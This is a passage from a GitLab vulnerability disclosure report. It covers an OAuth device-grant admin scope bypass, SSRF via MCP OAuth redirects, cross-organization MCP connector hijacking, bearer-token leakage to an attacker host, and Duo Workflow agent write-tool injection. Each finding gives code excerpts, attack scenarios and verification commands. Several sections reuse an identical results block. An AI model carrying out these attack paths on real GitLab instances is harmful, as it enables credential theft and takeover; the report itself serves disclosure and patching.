* **Affected Versions & Components:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/oauth/device_authorizations_controller.rb:4-50`, `app/controllers/oauth/tokens_controller.rb:42-75`
* **Vulnerability Class & Score:** `CWE-863 / CWE-285` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/zh-CN/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing `verify_admin_allowed!` Bypasses Default `disable_admin_oauth_scopes` (`CAND-02A`, `device_authorizations_controller.rb:4-42`):** In `Oauth::AuthorizationsController` (`authorizations_controller.rb:18, 274-296`), `before_action :verify_admin_allowed!` blocks any untrusted OAuth application (`trusted: false`) from connecting to an administrator account with dangerous scopes (`api`, `read_api`, `admin_mode`, `sudo`, `write_repository`) whenever `Gitlab::CurrentSettings.disable_admin_oauth_scopes` is `true` (the default GitLab security setting). Because `Oauth::DeviceAuthorizationsController` inherits directly from `Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController` without adding `before_action :verify_admin_allowed!`, any regular user can create an untrusted OAuth app (`trusted: false, device_code_enabled: true, scopes: 'api admin_mode'`) and obtain a full-privilege admin access token when an admin approves a `user_code` on `/oauth/device`.
2. **Step 2 — Missing `verify_confirmed_email!` Allows Unconfirmed Accounts to Mint Persistent OAuth Tokens (`CAND-02B`, `device_authorizations_controller.rb:4-42`):** GitLab allows newly registered or reconfirming users (`confirmed_at: nil`) an active web session within `allow_unconfirmed_access_for = 3.days` (`config/initializers/8_devise.rb:75, 103`), but `Oauth::AuthorizationsController` blocks them from minting OAuth tokens via `before_action :verify_confirmed_email!` (`403 Forbidden`). `Oauth::DeviceAuthorizationsController` omits `verify_confirmed_email!`, allowing unconfirmed accounts to mint persistent `access_token` and `refresh_token` credentials via `/oauth/device/authorize`.
3. **Step 3 — Missing `enforce_organization_maintenance_mode` and `device_code` Organization Lookup (`CAND-02C`, `tokens_controller.rb:42-70` & `device_authorizations_controller.rb:4-42`):** `Oauth::TokensController#organization_for_token_request` checks `refresh_token` and `authorization_code` grants against organization maintenance freezes (`migration` -> `503 Service Unavailable`, `legal` -> `403 Forbidden`), but omits `when 'urn:ietf:params:oauth:grant-type:device_code'`, while `Oauth::DeviceAuthorizationsController` omits both `set_current_organization` and `enforce_organization_maintenance_mode`.

```ruby
// File: app/controllers/oauth/device_authorizations_controller.rb (lines 4-35)
module Oauth
  class DeviceAuthorizationsController < Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController
    include RequestPayloadLogger

    layout 'minimal'
    # BUG: Missing before_action :verify_confirmed_email!, :verify_admin_allowed!
    # BUG: Missing prepend_before_action :set_current_organization
    # BUG: Missing before_action :enforce_organization_maintenance_mode

// File: app/controllers/oauth/tokens_controller.rb (lines 42-52)
  def organization_for_token_request
    token_params = params.permit(:grant_type, :refresh_token, :code)
    case token_params[:grant_type]
    when 'refresh_token'
      OauthAccessToken.by_refresh_token(token_params[:refresh_token])&.organization
    when 'authorization_code'
      OauthAccessGrant.by_token(token_params[:code])&.organization
    # BUG: Missing when 'urn:ietf:params:oauth:grant-type:device_code'
    end
  end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Full GitLab Instance Admin Takeover via Untrusted Developer CLI/IDE Device Code Despite `disable_admin_oauth_scopes=true`:** On any standard GitLab instance (`disable_admin_oauth_scopes=true` by default to prevent untrusted OAuth apps from ever receiving `api` or `admin_mode` privileges), a regular user or external contractor registers an untrusted OAuth app (`trusted: false, device_code_enabled: true, scopes: "api admin_mode sudo"`) disguised as an internal CLI or VS Code helper and shares a login `user_code`. The moment an administrator approves the code on `/oauth/device`, GitLab bypasses `disable_admin_oauth_scopes` and mints a full-privilege `admin_mode` + `api` token. The attacker immediately uses this token to clone every private repository in the company, dump all CI/CD production secrets (`AWS_SECRET_ACCESS_KEY`, database passwords), create new root administrator accounts, and take complete control of the GitLab server.
* **Scenario B — Persistent API Backdoor & CI/CD Abuse Using Unverified / Spoofed Corporate Email Accounts (`confirmed_at: nil`):** An attacker signs up with an unverified or spoofed email address (`confirmed_at: nil`). While standard web OAuth (`/oauth/authorize`) blocks the account with `403 Forbidden (unconfirmed_email)`, the attacker completes `/oauth/device/authorize` + `/oauth/token` (`grant_type=urn:ietf:params:oauth:grant-type:device_code`) and mints persistent `access_token` and `refresh_token` credentials without ever verifying email ownership—retaining programmatic API access to internal/public repositories and CI pipelines even after the web session expires.
* **Scenario C — Injecting Backdoored Code & Malicious `.gitlab-ci.yml` Pipelines During an Enterprise Incident Freeze or Legal Hold (`migration` / `legal` Maintenance Mode):** During a live security incident investigation (`legal` hold -> `403`) or data-center migration (`migration` -> `503`), enterprise administrators lock the entire organization in maintenance mode so no code or state can be modified. Because `Oauth::TokensController` omits `device_code` from `organization_for_token_request`, an attacker exchanges a device code during the freeze window and pushes malicious commits (`POST /api/v4/projects/1/repository/commits` -> `201 Created`) or tampers with release branches while the organization is supposedly frozen.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect missing before_action guards in DeviceAuthorizationsController vs AuthorizationsController
grep -n -C 6 "verify_admin_allowed!" \
  /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb \
  /home/community-user/targets/gitlab/app/controllers/oauth/device_authorizations_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report1_cand02
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-01_CAND-02A-02B-02C": {
    "GREEN": {
      "device_authorize_status": 503,
      "maintenance_mode_write_succeeded": false,
      "post_token_admin_action_succeeded": false,
      "redacted_token_sample": null,
      "standard_oauth_blocked": true,
      "token_exchange_status": 503,
      "token_minted_admin_mode": false
    },
    "RED": {
      "device_authorize_status": 200,
      "maintenance_mode_write_succeeded": true,
      "post_token_admin_action_succeeded": true,
      "redacted_token_sample": "[REDACTED_TEST_TOKEN_SHA256:91ba3cabf8cbd392]",
      "standard_oauth_blocked": true,
      "token_exchange_status": 200,
      "token_minted_admin_mode": true
    },
    "patches": {
      "GITLAB-CAND-02-COMBINED.patch": "33f6cf48a91be9d564f3964e9b9c7a4c6d412b6814ebfa71356102767bddc698",
      "GITLAB-CAND-02C-MAINTENANCE-MODE.patch": "80bfc7b3ee0e328487e4de303a9d707e575989f848d778914b359494fac90aa8"
    }
  }
}
```


---

### III.13 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog MCP OAuth `CallbackService`, `RefreshTokenService`, `RevokeTokenService`, and `DynamicRegistrationClient` `307 Temporary Redirect` / Unvalidated RFC 8414 Metadata SSRF & Error Body Reflection (`GITLAB-CAND-05`) (`CWE-918 / CWE-209`, CVSS `8.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`, `refresh_token_service.rb:18-70`, `dynamic_registration_client.rb:104-136`
* **Vulnerability Class & Score:** `CWE-918 / CWE-209` — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/zh-CN/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated RFC 8414 `token_endpoint`, `revocation_endpoint`, and `authorization_servers` (`dynamic_registration_client.rb:104-136`):** `DynamicRegistrationClient#discover_auth_server_url` and `#discover_metadata` validate only the initial discovery URL via `UrlBlocker`, but return `resource_metadata['authorization_servers'].first` and `response.parsed_response` (`token_endpoint`, `revocation_endpoint`, `issuer`) without running `Gitlab::HTTP_V2::UrlBlocker.validate!` on the discovered endpoints.
2. **Step 2 — `OAuth2::Client` (`oauth2 2.0.25`) Bypasses `Gitlab::HTTP` and Follows Up to 5 `307 Temporary Redirect` Hops (`callback_service.rb:38-50`, `refresh_token_service.rb:45-58`):** `CallbackService#build_oauth_client` and `RefreshTokenService#build_oauth_token` instantiate `OAuth2::Client.new` using Faraday's default `net_http` adapter (`max_redirects: 5`) without `UrlBlocker` or IP pinning. When an external OAuth server responds with `307 Temporary Redirect` to `http://127.0.0.1:...` or `http://169.254.169.254/latest/meta-data/...`, `OAuth2::Client` replays the full `POST` request (including `client_secret`, `code`, or `refresh_token`) directly against the internal target.
3. **Step 3 — Full Internal Error Body Reflection via `OAuth2::Error#message` (`callback_service.rb:24-25`, `refresh_token_service.rb:29-30`):** Both services rescue `OAuth2::Error => e` and pass `e.message` into `error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))`, which `Oauth::McpConnectorsAuthController#callback` assigns to `flash[:alert]`, exposing raw internal HTTP `4xx`/`5xx` response bodies to the user.

```ruby
// File: ee/app/services/ai/catalog/mcp_servers/callback_service.rb (lines 15-50)
        def execute
          token_params = { redirect_uri: redirect_uri }
          token_params[:code_verifier] = code_verifier if code_verifier

          access_token = build_oauth_client.auth_code.get_token(code, **token_params)
          store_token(access_token)
        rescue OAuth2::Error, StandardError => e
          # BUG 1: Reflects raw upstream HTTP error response body (e.message) into flash[:alert]
          error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))
        end
        ...
        def build_oauth_client
          auth_server_url = registration_service.discover_auth_server_url
          metadata = registration_service.discover_metadata(auth_server_url)
          # BUG 2: Uses OAuth2::Client (Faraday net_http, max_redirects: 5) without UrlBlocker or IP pinning!
          OAuth2::Client.new(
            mcp_server.oauth_client_id,
            mcp_server.oauth_client_secret,
            site: auth_server_url,
            authorize_url: metadata['authorization_endpoint'],
            token_url: metadata['token_endpoint'],
            auth_scheme: ::Gitlab::Oauth::DynamicRegistrationClient.token_endpoint_auth_scheme(metadata)
          )
        end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Stealing AWS/GCP Cloud IAM Credentials (`169.254.169.254`) and Internal Kubernetes/Vault Secrets Directly into the User's Browser (`flash[:alert]`):** An attacker registers an external MCP server whose OAuth `token_endpoint` responds with `307 Temporary Redirect` pointing to the cloud instance metadata service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/...`) or an internal Kubernetes/Vault/Consul API (`http://127.0.0.1:8080/...`). `OAuth2::Client` follows the redirect from inside the GitLab server network and reflects the raw HTTP response body via `OAuth2::Error#message` straight into the user's browser `flash[:alert]` banner (`iam_role_credentials_exposed: true`), allowing the attacker to steal the GitLab host's cloud IAM role keys and compromise the underlying cloud infrastructure.
* **Scenario B — Executing Authenticated Internal `POST` Commands Against Firewalled Intranet Services (`127.0.0.1` / `10.x.x.x`) & Leaking OAuth Secrets:** Because `307 Temporary Redirect` preserves both the `POST` method and request body, an external OAuth endpoint redirects `CallbackService` and `RefreshTokenService` (`max_redirects: 5`) to firewalled internal microservices (`http://127.0.0.1:...`), triggering internal `POST` actions behind the firewall while leaking the MCP connector's `client_secret` and `refresh_token` (`canary_b_request_count = 5`).
* **Scenario C — Internal Intranet Port/Service Scanning & Basic-Auth Credential Exfiltration on Disconnect (`RevokeTokenService`):** When an administrator or developer clicks "Disconnect" on an MCP connector, `RevokeTokenService` sends an unvalidated `POST` request with HTTP Basic Auth (`client_id:client_secret`) to `metadata['revocation_endpoint']`, enabling internal network probing and credential theft.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect OAuth2::Client usage and OAuth2::Error reflection in CallbackService & RefreshTokenService
grep -n -C 12 "OAuth2::Client.new" \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/callback_service.rb \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/refresh_token_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.14 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Oauth::McpConnectorsAuthController`, `ConnectService`, and `Gitlab::Oauth::ClientState` Missing Organization Isolation (`in_organization`), Unauthorized DCR Client Overwrite, and Unbound OAuth State (`GITLAB-CAND-06`) (`CWE-639 / CWE-862`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`, `ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`, `ee/lib/gitlab/oauth/client_state.rb:17-23`
* **Vulnerability Class & Score:** `CWE-639 / CWE-862` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/zh-CN/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unscoped Global `Ai::Catalog::McpServer.find` Across Organizations (`mcp_connectors_auth_controller.rb:19, 38, 63, 71-73`):** `Oauth::McpConnectorsAuthController` checks `can?(current_user, :read_ai_catalog_mcp_server, Current.organization)` against the caller's own organization, and then calls `::Ai::Catalog::McpServer.find(mcp_server_params[:id])` without `.in_organization(Current.organization)`. Any user in Organization A can target an `McpServer` belonging to Organization B by ID.
2. **Step 2 — Unauthorized Dynamic Client Registration (DCR) Credential Mutation with Read-Only Permission (`connect_service.rb:16-39, 60-79`):** When `mcp_server.oauth_client_id.blank?` is true, `ConnectService#execute` calls `register_oauth_client`, which overwrites `mcp_server.update!(oauth_client_id: ..., oauth_client_secret: ...)` without verifying `Ability.allowed?(current_user, :update_ai_catalog_mcp_server, mcp_server)`.
3. **Step 3 — `Gitlab::Oauth::ClientState.from_state` Discards `data` Binding (`client_state.rb:17-23`) and `callback` Accepts Missing PKCE Verifiers:** `ClientState.from_state(state)` calls `new(salt: salt, token: token, return_to: return_to)` without passing `data:`, so `@data` defaults to `{}` and the HMAC check verifies only `return_to` without binding `user_id`, `organization_id`, or `mcp_server_id`.

```ruby
// File: ee/app/controllers/oauth/mcp_connectors_auth_controller.rb (lines 18-65)
    def connect
      mcp_server = ::Ai::Catalog::McpServer.find(mcp_server_params[:id]) # BUG 1: Missing .in_organization(Current.organization)
      result = ::Ai::Catalog::McpServers::ConnectService.new(
        mcp_server: mcp_server,
        redirect_uri: oauth_mcp_connectors_callback_url,
        return_to: mcp_server_params[:return_to] || root_path
      ).execute # BUG 2: Mutates oauth_client_id/secret without checking :update_ai_catalog_mcp_server!

// File: ee/lib/gitlab/oauth/client_state.rb (lines 19-23)
      def self.from_state(state)
        salt, token, return_to = state.to_s.split(':', 3)
        new(salt: salt, token: token, return_to: return_to) # BUG 3: Omits data: binding!
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hijacking Another Organization's Enterprise AI / MCP Connector Across Tenant Boundaries (`Cross-Org IDOR`):** On a multi-organization GitLab deployment, an attacker in Organization A targets an `McpServer` ID belonging to Organization B via `POST /oauth/mcp_connectors/:id/connect`. Because `Oauth::McpConnectorsAuthController` omits `.in_organization(Current.organization)` and `ConnectService` omits `update_ai_catalog_mcp_server`, the attacker triggers Dynamic Client Registration (`register_oauth_client`) and overwrites Organization B's `oauth_client_id` and `oauth_client_secret` (`cross_org_server_mutated: true`)—redirecting the victim organization's AI connector OAuth flows and developer prompts/tokens to the attacker's OAuth client.
* **Scenario B — Read-Only Developer/Guest Overwrites Production AI Connector Credentials Within a Company:** A low-privileged user with only read permission (`read_ai_catalog_mcp_server`) invokes `/oauth/mcp_connectors/:id/connect` before or during connector setup and overwrites the server's `oauth_client_id` and `oauth_client_secret` without maintainer privileges (`update_ai_catalog_mcp_server`), hijacking or breaking the company's AI integration.
* **Scenario C — Cross-Session OAuth Account Binding (Login CSRF) via Unbound `ClientState` Token:** Because `ClientState.from_state` discards the `data` hash (`user_id` / `organization_id`) and `callback` makes PKCE `code_verifier` optional when absent from the session, an attacker tricks a victim developer into visiting a crafted `/oauth/mcp_connectors/callback?state=...&code=...` link, silently binding the victim's GitLab session to the attacker's external MCP account (`McpServerUserConnection`) so every AI tool call the victim makes streams workspace data to the attacker.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect unscoped McpServer.find in McpConnectorsAuthController and ConnectService
grep -n -C 8 "McpServer.find" \
  /home/community-user/targets/gitlab/ee/app/controllers/oauth/mcp_connectors_auth_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.15 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — GitLab Workhorse DuoWorkflow External MCP Client Missing `transport.WithSSRFFilter()` and Cross-Origin Redirect `Authorization: Bearer` Token Leakage (`GITLAB-CAND-01`) (`CWE-918 / CWE-522`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`Go / GitLab Workhorse: gitlab.com/gitlab-org/gitlab/workhorse`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239`
* **Vulnerability Class & Score:** `CWE-918 / CWE-522` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/zh-CN/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `externalMcpTransport` Omits `transport.WithSSRFFilter` (`workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44`):** In GitLab Workhorse's `transport` package, `transport.NewRestrictedTransport` only blocks loopback (`127.0.0.1`), link-local metadata (`169.254.169.254`), and RFC1918 private IPs when `transport.WithSSRFFilter(...)` is explicitly passed (as done in `workhorse/internal/sendurl/sendurl.go:365-374`). `externalMcpTransport` in `mcp.go:41-44` omits `transport.WithSSRFFilter`, leaving external MCP connections completely unfiltered at the dialer/transport layer.
2. **Step 2 — `roundTripper.RoundTrip` Re-Injects `Authorization: Bearer` Headers on Every Redirect Hop (`mcp.go:101-104, 231-234`):** Go's `http.Client` normally strips `Authorization` headers on cross-origin redirects *before* calling `Transport.RoundTrip`. However, `duoworkflow.roundTripper.RoundTrip` loops over `t.headers` (`r.Header.Set(name, value)`) inside `RoundTrip` itself and `HTTPClient` defines no `CheckRedirect` policy. Consequently, on any `301`/`302`/`307` redirect to a different host or internal IP, Workhorse re-attaches `Authorization: Bearer <token>` and sends it to the redirect destination.

```ruby
// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 41-44, 101-104, 231-234)
var externalMcpTransport = transport.NewRestrictedTransport(func(t *http.Transport) {
	t.MaxIdleConns = externalMcpMaxIdleConns
	t.MaxIdleConnsPerHost = externalMcpMaxIdleConnsPerHost
}) // BUG 1: Missing transport.WithSSRFFilter(false, nil)!

func (t *roundTripper) RoundTrip(r *http.Request) (*http.Response, error) {
	for name, value := range t.headers {
		r.Header.Set(name, value) // BUG 2: Re-injects Authorization header on cross-origin redirect hops!
	}
...
	t = &mcp.StreamableClientTransport{
		Endpoint:   endpoint,
		HTTPClient: &http.Client{Transport: rt}, // BUG 3: No CheckRedirect policy!
		DisableStandaloneSSE: true,
	}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Stealing a Victim Developer's or Administrator's Live `Authorization: Bearer` Token via Cross-Origin `302` Redirect (Full Account & Private Repository Takeover):** When a developer or administrator runs a Duo Workflow AI session connected to an external MCP tool server, GitLab Workhorse (`mcp.go`) attaches the user's live `Authorization: Bearer <token>` header. When the external server responds with a `302 Found` redirect to an attacker-controlled domain (`https://attacker-collector.example/collect`), `roundTripper.RoundTrip` re-injects `Authorization: Bearer <token>` on the cross-origin hop (`bearer_token_leaked_to_canary: true`). The attacker captures the live Bearer token and immediately uses it to clone private repositories, read sensitive issues/merge requests, or push malicious code as the victim.
* **Scenario B — Workhorse Server-Side Request Forgery (SSRF) Against Internal Loopback (`127.0.0.1`), Gitaly/Redis/Puma Exporters, and Cloud Metadata (`169.254.169.254`):** Because `externalMcpTransport` in `mcp.go:41-44` omits `transport.WithSSRFFilter()` (unlike `sendurl.go`), an external MCP URL that passes initial Rails validation can issue a `302` redirect directly to `http://127.0.0.1:8080`, internal Prometheus/Puma admin endpoints, or `http://169.254.169.254/`, allowing attackers to reach internal services directly from the Workhorse reverse-proxy process.
* **Scenario C — DNS Rebinding Bypass Into the Internal Corporate Network:** An external MCP hostname resolves to a public IP when registered in GitLab Rails, then rebinds (`TTL=0`) to `127.0.0.1` or `10.0.0.1` when Workhorse opens the long-lived MCP stream—bypassing Rails URL validation because Workhorse's socket dialer lacks `WithSSRFFilter`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Compare externalMcpTransport in duoworkflow/mcp.go against sendurl/sendurl.go
grep -n -C 8 "NewRestrictedTransport" \
  /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go \
  /home/community-user/targets/gitlab/workhorse/internal/sendurl/sendurl.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.16 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — Duo Workflow `/ws` and `McpConfigService#item_version` Missing `:read_ai_catalog_item` Authorization and Unvalidated `workflow_definition` Override Allowing Private Agent Write-Tool Injection (`GITLAB-CAND-08`) (`CWE-862 / CWE-639`, CVSS `7.7 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`, `ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`, `connection_config_service.rb:220-228`
* **Vulnerability Class & Score:** `CWE-862 / CWE-639` — **CVSS v3.1: `7.7 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/zh-CN/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — In-File Authorization Inconsistency in `McpConfigService` (`mcp_config_service.rb:134` vs. `334`):** In `ee/app/services/ai/duo_workflows/mcp_config_service.rb`, `ai_catalog_mcp_servers` (line 334) explicitly enforces `return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version)`. However, in the exact same file, `item_version` (line 134), `agent_mcp_tools` (line 297), and `built_in_tool_ids` (line 318) call `::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id)` without any `Ability.allowed?` check.
2. **Step 2 — `GET /api/v4/ai/duo_workflows/ws` (`workflows.rb:1065`) Bypasses the Developer's Security Rule at Line 1426:** At `workflows.rb:1426-1433`, a developer comment states: `# The definition comes off the record for the same reason: it selects the MCP tool set and the minted token's feature, so the body must not be able to swap in another flow's.` Yet `get :ws` (`workflows.rb:1065`) omits `workflow_definition: workflow.workflow_definition` and `ConnectionConfigService#mcp_config_service` (`connection_config_service.rb:220-228`) reads `request_metadata.workflow_definition` and `request_metadata.ai_catalog_item_version_id` directly from user query parameters.
3. **Step 3 — Injection of Foreign Private Agent Opt-In Write Tools:** By passing a foreign private (`public: false`) agent's `ai_catalog_item_version_id` and overriding `workflow_definition` on `/ws`, an authenticated caller injects opt-in write tools (`create_issue`, `create_merge_request`) into `x-gitlab-duo-workflow-mcp-servers` and discloses the private agent's configured tool set.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 131-135 vs 330-335)
      def item_version
        return unless ai_catalog_item_version_id.present?

        ::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id) # BUG 1: Missing Ability.allowed?(current_user, :read_ai_catalog_item, version)!
      end
      ...
      def ai_catalog_mcp_servers
        return {} unless item_version
        return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version) # Enforced here at line 334, but omitted at line 134!

// File: ee/app/services/ai/duo_workflows/connection_config_service.rb (lines 222-228)
      def mcp_config_service
        ::Ai::DuoWorkflows::McpConfigService.new(
          current_user,
          gitlab_token,
          workflow_definition: request_metadata.workflow_definition, # BUG 2: Uses unvalidated request_metadata instead of workflow record!
          ai_catalog_item_version_id: request_metadata.ai_catalog_item_version_id,
          namespace: project&.project_namespace || enforcement_namespace
        )
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
